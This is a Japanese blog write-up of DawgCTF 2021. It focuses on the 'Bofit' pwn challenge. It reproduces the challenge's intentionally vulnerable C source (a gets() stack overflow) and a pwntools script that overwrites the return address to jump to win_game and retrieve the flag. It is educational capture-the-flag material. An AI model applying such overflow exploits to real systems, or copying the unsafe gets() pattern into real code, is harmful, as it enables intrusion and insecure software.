---
title: "DawgCTF 2021 Writeup"
date: 2021-05-09T11:00:00+09:00
lastmod: 2021-05-09T11:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fdawgctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}


URL: [https://umbccd.io/](https://umbccd.io/)
<br /><br />

730点を獲得し、最終順位は209位でした。<br />
<img src="https://captureamerica.github.io/writeups/img/dawgctf_2021_score.png" alt="dawgctf_2021_score.png">

<br>

以下は解いたチャレンジです。<br />

<img src="https://captureamerica.github.io/writeups/img/dawgctf_2021_solves1.png" alt="dawgctf_2021_solves1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/dawgctf_2021_solves2.png" alt="dawgctf_2021_solves2.png">

<br><br>

<img src="https://captureamerica.github.io/writeups/img/dawgctf_2021_solves3.png" alt="dawgctf_2021_solves3.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/dawgctf_2021_solves4.png" alt="dawgctf_2021_solves4.png">

<br><br>

わけがわからないチャレンジが結構あったな、というのが正直な感想です。みんな、よく頑張って解いているなぁ、と思いました。

<br>

RSAの2つは RsaCtfTool.py で解いて 350 (150 + 200) points 取っているし、他も簡単なのしか解けてないですが、とりあえず Pwn の 一個だけ Writeup 残しておきます。


<br /><br />
## [Pwn]: Bofit (125 points)
- - -
### Challenge
> Because Bop It is copyrighted, apparently
<br /><br />

Attachment:

- bofit (ELF 64bit)
- bofit.c

以下、ソースコードの中身です。

```C
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}

int play_game(){
	char c;
	char input[20];
	int choice;
	bool correct = true;
	int score = 0;
	srand(time(0));
	while(correct){
		choice = rand() % 4;
		switch(choice){
			case 0:
				printf("BOF it!\n");
				c = getchar();
				if(c != 'B') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 1:
				printf("Pull it!\n");
				c = getchar();
				if(c != 'P') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 2:
				printf("Twist it!\n");
				c = getchar();
				if(c != 'T') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
		}
		score++;
	}
	return score;
}

void welcome(){
	char input;
	printf("Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes\n");
	printf("You'll have a second to respond to a series of commands\n");
	printf("BOF it: Reply with a capital \'B\'\n");
	printf("Pull it: Reply with a capital \'P\'\n");
	printf("Twist it: Reply with a capital \'T\'\n");
	printf("Shout it: Reply with a string of at least 10 characters\n");
	printf("BOF it to start!\n");
	input = getchar();
	while(input != 'B'){
		printf("BOF it to start!\n");
		input = getchar();
	}
	while((input = getchar()) != '\n' && input != EOF);
}

int main(){
	int score = 0;
	welcome();
	score = play_game();
	printf("Congrats! Final score: %d\n", score);
	return 0;
}
```

<br />

### Solution
play_game()関数の中にBOFの脆弱性が存在します。

そこに辿り着く前に、まず'B'を送って、次に "Shout it" が出るまで 'B', 'P', または 'T' を送り続ける必要があります。

あとは、BOFを発生させて win_game() に飛ぶだけです。

<br />

<pre>
$ checksec bofit
[*] '/home/captureamerica/Mac_Downloads/bofit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</pre>

<br />
win_game()のアドレスは以下の通りです。gdbのi funcで確認してます。No PIEなので、これは固定です。

<pre>
0x0000000000401256  win_game
</pre>


<br />

書いたコード。

```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *

if 0:
    s = process('./bofit')
else:
    host, port = 'umbccd.io', 4100
    s = remote(host, port)

s.recvuntil('BOF it to start!\n')
s.sendline('B')

while 1:
    msg = s.recvuntil('\n')
    if "Shout it!" in msg:
        print(msg)
        break
    c = list(msg)
    s.sendline(c[0])

payload = ''
payload += b'A' * 20
payload += b'B' * 20
payload += p64(0x0000000000401256)  # win_game()
payload += p64(0x0000000000401256)  # win_game()
payload += p64(0x0000000000401256)  # win_game()
s.sendline(payload)
msg = s.recvall()
print(msg)
s.close()
```


<br />

Flag: `DawgCTF{n3w_h1gh_sc0r3!!}`

<br />

実のところ、'B'の20バイトの辺りとか、win_game()のアドレスの繰り返しとか、あまり考えずにトライ・アンド・エラーでテキトーにやってます。

ちゃんと理解した上でやらねば。。。


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

